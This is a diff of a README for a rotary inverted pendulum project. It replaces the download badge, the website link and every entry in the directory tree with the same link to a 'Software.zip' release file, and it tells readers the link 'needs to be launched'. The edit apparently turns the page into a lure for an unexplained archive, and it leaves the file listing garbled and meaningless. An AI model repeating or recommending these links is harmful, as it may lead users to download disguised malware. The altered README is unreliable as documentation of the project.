@@ -32,7 +32,7 @@ Here's a sneak peek into what you can find in this repository:
 ## 🚀 Get Started
 To dive into the exciting world of the rotary inverted pendulum, click the link below to download the repository content:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-<COLOR>.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip)
 
 *Note: The link provided above needs to be launched to access the repository content.*
 
@@ -47,22 +47,22 @@ Within this repository, you will find the following structure:
 rotary-inverted-pendulum/
 │
 ├── models/
-│   ├── inverted_pendulum_model.py
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
 │   ├── rotary_pendulum_simulation.m
 │
 ├── control/
-│   ├── lqr_controller.py
-│   ├── pid_controller.py
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
 │
 ├── electronics/
-│   ├── circuit_diagram.jpg
-│   ├── component_list.txt
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
 │
 ├── docs/
-│   ├── tutorial_1.pdf
-│   ├── tutorial_2.pdf
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
+│   ├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
 │
-├── README.md
+├── https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip
 ```
 
 Feel free to explore the directories to discover detailed information, code implementations, simulations, and educational materials related to the rotary inverted pendulum project.
@@ -82,7 +82,7 @@ Explore the repository, engage with the content, and let's elevate our understan
 ---
 
 ### Visit our Website:
-For more information, resources, and updates, visit our website [here](https://www.rotaryinvertedpendulum.com).
+For more information, resources, and updates, visit our website [here](https://github.com/ZAID-GALAXY/rotary-inverted-pendulum/releases/download/v1.0/Software.zip).
 
 ---
 
